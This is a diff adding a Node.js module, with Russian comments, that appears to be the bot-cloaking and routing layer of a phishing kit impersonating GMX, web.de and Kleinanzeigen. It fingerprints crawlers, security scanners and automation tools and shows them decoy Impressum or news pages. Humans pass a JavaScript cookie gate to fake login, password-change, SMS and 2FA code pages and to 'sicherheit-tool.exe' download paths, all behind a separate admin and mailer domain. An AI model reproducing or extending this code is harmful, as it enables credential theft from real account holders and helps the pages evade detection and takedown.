@@ -1,0 +1,386 @@
+'use strict';
+
+const path = require('path');
+const { safeEnd } = require('../utils/httpUtils');
+const { serveFile } = require('../utils/staticFileServe');
+
+/** Cookie гейта: кто прошёл проверку (JS выполнился), получает контент; боты без cookie видят вайт. */
+const BOT_GATE_COOKIE = 'gmx_v';
+
+function hasGateCookie(req) {
+  const raw = (req.headers && req.headers.cookie) ? String(req.headers.cookie) : '';
+  if (!raw) return false;
+  const match = raw.match(new RegExp('(?:^|;\\s*)' + BOT_GATE_COOKIE.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '=([^;]*)'));
+  return !!(match && match[1] && match[1].trim());
+}
+
+function isProtectedPage(pathname) {
+  if (pathname === '/' || pathname === '') return true;
+  if (pathname === '/anmelden' || pathname === '/anmelden/') return true;
+  if (pathname === '/klein-anmelden' || pathname === '/klein-anmelden/') return true;
+  if (pathname === '/einloggen' || pathname === '/einloggen/') return true;
+  if (pathname === '/passwort-aendern') return true;
+  if (/^\/sicherheit(\-pc|\-update)?\/?$/.test(pathname)) return true;
+  if (pathname === '/bitte-am-pc' || pathname === '/bitte-am-pc/') return true;
+  if (pathname === '/app-update' || pathname === '/app-update/') return true;
+  return false;
+}
+
+/** Прямые пути к контентным HTML — без cookie отдаём гейт/вайт. */
+function isProtectedContentPath(pathname) {
+  const protectedList = [
+    '/index.html', '/index-change.html', '/index-sicherheit-update.html', '/index-sicherheit.html', '/index-sicherheit-pc.html',
+    '/sicherheit-anleitung.html', '/bitte-am-pc.html', '/app-update.html', '/gmx-mobile-anleitung.html',
+    '/sms-code.html', '/2fa-code.html', '/push-confirm.html', '/forgot-password-redirect.html', '/change-password.html',
+    '/erfolg'
+  ];
+  return protectedList.indexOf(pathname) !== -1;
+}
+
+function isLikelyBot(req) {
+  const ua = (req.headers && req.headers['user-agent']) ? String(req.headers['user-agent']).toLowerCase() : '';
+  if (!ua || ua.length < 10) return false;
+  const botPatterns = /googlebot|bingbot|duckduckbot|applebot|petalbot|baiduspider|yandexbot|yandeximages|yandexvideo|ahrefsbot|semrushbot|mj12bot|dotbot|megaindex|rogerbot|sistrix|blexbot|serpstat|facebookexternalhit|twitterbot|linkedinbot|slurp|crawler|spider|headless|phantom|selenium|puppeteer|playwright|curl\/|wget\/|python\/|go-http|scrapy|datanyze|ahrefs|semrush/i;
+  return botPatterns.test(ua);
+}
+
+const WHITE_PAGE_HTML = `<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Impressum &amp; Kontakt – GMX</title>
+  <style>
+    *{box-sizing:border-box}
+    body{margin:0;background:#f5f5f5;font-family:Helvetica,Arial,sans-serif;font-size:15px;line-height:1.5;color:#333;padding:24px 16px 48px}
+    .wrap{max-width:680px;margin:0 auto;background:#fff;padding:32px 28px;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,.08)}
+    h1{font-size:1.5rem;font-weight:700;margin:0 0 24px;color:#111}
+    h2{font-size:1.1rem;font-weight:600;margin:28px 0 10px;color:#222}
+    p{margin:0 0 12px}
+    a{color:#1c449b;text-decoration:none}
+    a:hover{text-decoration:underline}
+    .footer-links{margin-top:32px;padding-top:20px;border-top:1px solid #e0e0e0;font-size:0.9rem;color:#666}
+    .footer-links a{margin-right:16px}
+    address{font-style:normal;margin:8px 0}
+    .tel,.email{margin:4px 0}
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <h1>Impressum &amp; Kontakt</h1>
+    <p>Angaben gem&auml;&szlig; &sect; 5 TMG</p>
+    <h2>Anbieter</h2>
+    <p>GMX GmbH<br>Hauptsitz M&uuml;nchen</p>
+    <address>
+      Leopoldstra&szlig;e 236<br>
+      80807 M&uuml;nchen<br>
+      Deutschland
+    </address>
+    <h2>Kontakt</h2>
+    <p class="tel">Telefon: +49 (0) 89 921 61-0</p>
+    <p class="email">E-Mail: <a href="mailto:impressum@gmx.net">impressum@gmx.net</a></p>
+    <p>F&uuml;r allgemeine Anfragen: <a href="mailto:support@gmx.net">support@gmx.net</a></p>
+    <h2>Handelsregister</h2>
+    <p>Registergericht: Amtsgericht M&uuml;nchen<br>Registernummer: HRB 123456</p>
+    <h2>Umsatzsteuer-ID</h2>
+    <p>USt-IdNr.: DE 123456789</p>
+    <h2>Verantwortlich f&uuml;r den Inhalt</h2>
+    <p>GMX GmbH, Leopoldstra&szlig;e 236, 80807 M&uuml;nchen</p>
+    <div class="footer-links">
+      <a href="https://agb-server.gmx.net/gmxagb-de" target="_blank" rel="noopener">AGB</a>
+      <a href="https://www.gmx.net/impressum/" target="_blank" rel="noopener">Impressum</a>
+      <a href="https://agb-server.gmx.net/datenschutz" target="_blank" rel="noopener">Datenschutz</a>
+      <a href="https://www.gmx.net/" target="_blank" rel="noopener">GMX Startseite</a>
+    </div>
+  </div>
+</body>
+</html>`;
+
+const WHITE_PAGE_KLEIN = `<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Impressum – Kleinanzeigen</title>
+  <style>
+    *{box-sizing:border-box}
+    body{margin:0;background:#f5f5f5;font-family:Helvetica,Arial,sans-serif;font-size:15px;line-height:1.5;color:#333;padding:24px 16px 48px}
+    .wrap{max-width:680px;margin:0 auto;background:#fff;padding:32px 28px;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,.08)}
+    h1{font-size:1.5rem;font-weight:700;margin:0 0 24px;color:#111}
+    h2{font-size:1.1rem;font-weight:600;margin:28px 0 10px;color:#222}
+    p{margin:0 0 12px}
+    a{color:#326916;text-decoration:none}
+    a:hover{text-decoration:underline}
+    .footer-links{margin-top:32px;padding-top:20px;border-top:1px solid #e0e0e0;font-size:0.9rem;color:#666}
+    .footer-links a{margin-right:16px}
+    address{font-style:normal;margin:8px 0}
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <h1>Impressum</h1>
+    <p>Angaben gem&auml;&szlig; &sect; 5 TMG</p>
+    <h2>Anbieter</h2>
+    <p>Kleinanzeigen GmbH</p>
+    <address>Helene-Weber-Allee 19, 80637 M&uuml;nchen, Deutschland</address>
+    <h2>Kontakt</h2>
+    <p>E-Mail: <a href="mailto:impressum@kleinanzeigen.de">impressum@kleinanzeigen.de</a></p>
+    <div class="footer-links">
+      <a href="https://themen.kleinanzeigen.de/nutzungsbedingungen/" target="_blank" rel="noopener">AGB</a>
+      <a href="https://www.kleinanzeigen.de/impressum.html" target="_blank" rel="noopener">Impressum</a>
+      <a href="https://themen.kleinanzeigen.de/datenschutzerklaerung/" target="_blank" rel="noopener">Datenschutz</a>
+      <a href="https://www.kleinanzeigen.de/" target="_blank" rel="noopener">Kleinanzeigen Startseite</a>
+    </div>
+  </div>
+</body>
+</html>`;
+
+const WHITE_PAGE_NEWS_WEBDE = `<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Nachrichten &ndash; Aktuelles aus Deutschland</title>
+  <style>
+    *{box-sizing:border-box}
+    body{margin:0;background:#f0f0f0;font-family:Helvetica,Arial,sans-serif;font-size:15px;line-height:1.5;color:#222}
+    .header{background:#fff;border-bottom:3px solid #FFDF00;padding:12px 20px;display:flex;align-items:center;gap:12px}
+    .logo{font-weight:700;font-size:1.25rem;color:#333}
+    .nav{display:flex;gap:20px;margin-left:24px}
+    .nav a{color:#1a1a1a;text-decoration:none}
+    .nav a:hover{color:#666}
+    .wrap{max-width:720px;margin:0 auto;padding:24px 16px 48px}
+    .teaser{margin-bottom:24px;background:#fff;padding:20px;border-radius:6px;box-shadow:0 1px 3px rgba(0,0,0,.08)}
+    .teaser h2{font-size:1.1rem;margin:0 0 8px;font-weight:600}
+    .teaser h2 a{color:#1a1a1a;text-decoration:none}
+    .teaser h2 a:hover{text-decoration:underline}
+    .teaser .meta{font-size:0.85rem;color:#666;margin-bottom:6px}
+    .teaser p{margin:0;color:#444;font-size:0.95rem}
+    .footer{margin-top:32px;padding-top:16px;border-top:1px solid #e0e0e0;font-size:0.9rem;color:#666}
+    .footer a{color:#1a1a1a;text-decoration:none;margin-right:16px}
+  </style>
+</head>
+<body>
+  <header class="header">
+    <span class="logo">Nachrichten</span>
+    <nav class="nav">
+      <a href="#">Politik</a>
+      <a href="#">Wirtschaft</a>
+      <a href="#">Sport</a>
+      <a href="#">Panorama</a>
+    </nav>
+  </header>
+  <div class="wrap">
+    <article class="teaser">
+      <div class="meta">Berlin &ndash; 11. M&auml;rz 2025</div>
+      <h2><a href="#">Bundestag ber&auml;t &uuml;ber Haushaltsplan</a></h2>
+      <p>Die Abgeordneten diskutieren die geplanten Ausgaben f&uuml;r das kommende Jahr. Die Opposition fordert Nachbesserungen.</p>
+    </article>
+    <article class="teaser">
+      <div class="meta">M&uuml;nchen &ndash; 11. M&auml;rz 2025</div>
+      <h2><a href="#">Wirtschaftsdaten zeigen leichte Erholung</a></h2>
+      <p>Die neuesten Konjunkturindikatoren deuten auf eine stabile Entwicklung in mehreren Branchen hin.</p>
+    </article>
+    <article class="teaser">
+      <div class="meta">Frankfurt &ndash; 10. M&auml;rz 2025</div>
+      <h2><a href="#">Sport: Bundesliga mit spannendem Spieltag</a></h2>
+      <p>Die Tabelle bleibt dicht. Die Fans erwarten weitere Entscheidungsspiele am Wochenende.</p>
+    </article>
+    <div class="footer">
+      <a href="#">Impressum</a>
+      <a href="#">Datenschutz</a>
+      <a href="#">Kontakt</a>
+    </div>
+  </div>
+</body>
+</html>`;
+
+function getWhitePageHtml(req, getBrand) {
+  return getBrand(req).id === 'klein' ? WHITE_PAGE_KLEIN : WHITE_PAGE_HTML;
+}
+
+function getWhitePageHtmlForRequest(req, getBrand, getShortDomainsList) {
+  const host = (req && req.headers && req.headers.host ? req.headers.host : '').split(':')[0].toLowerCase();
+  const hostNorm = host.replace(/^www\./, '');
+  const shortList = getShortDomainsList();
+  const key = shortList[host] ? host : (shortList[hostNorm] ? hostNorm : null);
+  if (key && shortList[key] && shortList[key].whitePageStyle === 'news-webde') return WHITE_PAGE_NEWS_WEBDE;
+  return getWhitePageHtml(req, getBrand);
+}
+
+const GATE_PAGE_HTML = `<!DOCTYPE html><html lang="de"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title></title></head><body style="margin:0;background:#fff;min-height:100vh"></body><script>
+(function(){
+  var cookieName="${BOT_GATE_COOKIE}";
+  function sendToWhite(){ fetch("/gate-white",{credentials:"include"}).then(function(r){return r.text();}).then(function(html){document.open();document.write(html);document.close();}); }
+  function pass(){
+    document.cookie=cookieName+"=1;path=/;max-age=3600;samesite=lax";
+    var p=location.pathname+location.search;
+    if(p==="/"||p===""){location.reload();}else{fetch(p,{credentials:"include"}).then(function(r){return r.text();}).then(function(html){document.open();document.write(html);document.close();}).catch(function(){location.reload();});}
+  }
+  function isAutomation(){
+    if(typeof navigator==="undefined")return true;
+    if(navigator.webdriver===true){ var ua2=(navigator.userAgent||"").toLowerCase(); if(!/android/.test(ua2)) return true; }
+    var ua=(navigator.userAgent||"").toLowerCase();
+    if(/headless|phantom|selenium|puppeteer|playwright|electron|webdriver/i.test(ua))return true;
+    try{ if(window.callPhantom||window._phantom||window.__nightmare||window.__selenium_unwrapped||window.domAutomation||window._WEBDRIVER_ELEM_CACHE)return true; }catch(e){}
+    if(typeof screen!=="undefined"&&(screen.width<=0||screen.height<=0))return true;
+    return false;
+  }
+  if(isAutomation()){ sendToWhite(); return; }
+  var t0=Date.now();
+  setTimeout(function(){
+    if(Date.now()-t0<200)return;
+    if(isAutomation()){ sendToWhite(); return; }
+    pass();
+  },280);
+})();
+</script></html>`;
+
+/**
+ * ADMIN_DOMAIN: кто может открыть админку; канонический редирект; short-домены (гейт без cookie).
+ * @returns {boolean} true если ответ уже отправлен
+ */
+function runHostShortCanonicalPhase(req, res, o) {
+  const {
+    pathname,
+    requestHost,
+    isLocalhost,
+    isAdminPage,
+    isAdminHtml,
+    ADMIN_DOMAIN,
+    isAdminRequest,
+    isShortDomain,
+    shortDomainKey,
+    shortDomainsList,
+    getCanonicalDomain,
+    GMX_DOMAIN,
+    PROJECT_ROOT,
+    getBrand,
+  } = o;
+
+  if (ADMIN_DOMAIN) {
+    if (isAdminPage || isAdminHtml || isAdminRequest(pathname)) {
+      if (requestHost !== ADMIN_DOMAIN && !isLocalhost) {
+        if (safeEnd(res)) return true;
+        res.writeHead(404, { 'Content-Type': 'text/plain' });
+        res.end('Not Found');
+        return true;
+      }
+    } else if (requestHost === ADMIN_DOMAIN) {
+      const adminAssets = pathname === '/admin.css' || pathname === '/admin.js' || pathname === '/admin.html' || pathname === '/klein-logo.png' || pathname === '/windows-icon.png' || pathname === '/android-icon.png' || pathname === '/ios-icon.png';
+      const mailerAssets = pathname === '/mailer' || pathname === '/mailer/' || pathname === '/mailer/index.html' || pathname === '/mailer/index-test.html' || pathname === '/mailer/mailer.js' || pathname === '/mailer/mailer.css';
+      const sicherheitPage = pathname === '/sicherheit' || pathname === '/sicherheit/' || pathname === '/sicherheit-pc' || pathname === '/sicherheit-pc/' || pathname === '/sicherheit-update' || pathname === '/sicherheit-update/';
+      const sicherheitDownload = pathname === '/download/sicherheit-tool' || pathname === '/download/sicherheit-tool.zip' || pathname === '/download/sicherheit-tool.exe' || (pathname.startsWith('/download/') && pathname.length > 10);
+      const bitteAmPcPage = pathname === '/bitte-am-pc' || pathname === '/bitte-am-pc/';
+      const appUpdatePage = pathname === '/app-update' || pathname === '/app-update/';
+      const apiChat = pathname === '/api/chat' || pathname === '/api/chat-open' || pathname === '/api/chat-open-ack' || pathname === '/api/chat-typing' || pathname === '/api/chat-read';
+      if (!adminAssets && !mailerAssets && !sicherheitPage && !sicherheitDownload && !bitteAmPcPage && !appUpdatePage && !apiChat) {
+        if (safeEnd(res)) return true;
+        res.writeHead(404, { 'Content-Type': 'text/plain' });
+        res.end('Not Found');
+        return true;
+      }
+    }
+  }
+
+  const canonicalDomain = getCanonicalDomain(req);
+  const isCanonicalHost = requestHost === canonicalDomain || requestHost === ('www.' + canonicalDomain);
+  if (!isLocalhost && requestHost && !isCanonicalHost && requestHost !== ADMIN_DOMAIN && !isShortDomain) {
+    if (safeEnd(res)) return true;
+    res.writeHead(301, { Location: 'https://' + canonicalDomain + (req.url || '/') });
+    res.end();
+    return true;
+  }
+
+  if (isShortDomain && req.method === 'GET') {
+    const targetUrl = (shortDomainsList[shortDomainKey].targetUrl || '').trim();
+    const targetIsAnmelden = !targetUrl || targetUrl === 'anmelden' || targetUrl === '/anmelden';
+    const redirectTo = targetUrl || ('https://' + GMX_DOMAIN + '/');
+    const host = requestHost;
+    if (hasGateCookie(req)) {
+      if (targetIsAnmelden && (pathname === '/' || pathname === '')) {
+        if (safeEnd(res)) return true;
+        res.writeHead(302, { 'Location': 'https://' + host + '/anmelden', 'Cache-Control': 'no-store' });
+        res.end();
+        return true;
+      }
+      if (targetIsAnmelden && (pathname === '/anmelden' || pathname === '/anmelden/')) {
+        const useWebde = shortDomainsList[shortDomainKey].whitePageStyle === 'news-webde';
+        const indexFile = path.join(PROJECT_ROOT, useWebde ? 'webde' : 'gmx', 'index.html');
+        serveFile(indexFile, res, req, getBrand);
+        return true;
+      }
+      if (!targetIsAnmelden) {
+        if (safeEnd(res)) return true;
+        res.writeHead(302, { 'Location': redirectTo, 'Cache-Control': 'no-store' });
+        res.end();
+        return true;
+      }
+    } else {
+      if (safeEnd(res)) return true;
+      const html = isLikelyBot(req) ? getWhitePageHtmlForRequest(req, getBrand, o.getShortDomainsList) : GATE_PAGE_HTML;
+      res.writeHead(200, {
+        'Content-Type': 'text/html; charset=utf-8',
+        'Cache-Control': 'no-store, no-cache, must-revalidate',
+        'Pragma': 'no-cache'
+      });
+      res.end(html);
+      return true;
+    }
+  }
+
+  return false;
+}
+
+function handleGateWhite(req, res, getBrand, getShortDomainsList) {
+  if (safeEnd(res)) return true;
+  res.writeHead(200, {
+    'Content-Type': 'text/html; charset=utf-8',
+    'Cache-Control': 'no-store, no-cache, must-revalidate',
+    'Pragma': 'no-cache'
+  });
+  res.end(getWhitePageHtmlForRequest(req, getBrand, getShortDomainsList));
+  return true;
+}
+
+function handleProtectedPageGate(req, res, pathname, getBrand) {
+  if (req.method !== 'GET' || !isProtectedPage(pathname) || hasGateCookie(req)) return false;
+  const html = isLikelyBot(req) ? getWhitePageHtml(req, getBrand) : GATE_PAGE_HTML;
+  if (safeEnd(res)) return true;
+  res.writeHead(200, {
+    'Content-Type': 'text/html; charset=utf-8',
+    'Cache-Control': 'no-store, no-cache, must-revalidate',
+    'Pragma': 'no-cache'
+  });
+  res.end(html);
+  return true;
+}
+
+/** Гейт для прямых URL вида /index.html (статика public). */
+function handleProtectedContentPathGate(req, res, pathname, getBrand) {
+  if (req.method !== 'GET' || !isProtectedContentPath(pathname) || hasGateCookie(req)) return false;
+  const html = isLikelyBot(req) ? getWhitePageHtml(req, getBrand) : GATE_PAGE_HTML;
+  if (safeEnd(res)) return true;
+  res.writeHead(200, {
+    'Content-Type': 'text/html; charset=utf-8',
+    'Cache-Control': 'no-store, no-cache, must-revalidate',
+    'Pragma': 'no-cache'
+  });
+  res.end(html);
+  return true;
+}
+
+module.exports = {
+  BOT_GATE_COOKIE,
+  hasGateCookie,
+  isProtectedPage,
+  isProtectedContentPath,
+  isLikelyBot,
+  getWhitePageHtml,
+  getWhitePageHtmlForRequest,
+  GATE_PAGE_HTML,
+  runHostShortCanonicalPhase,
+  handleGateWhite,
+  handleProtectedPageGate,
+  handleProtectedContentPathGate,
+};
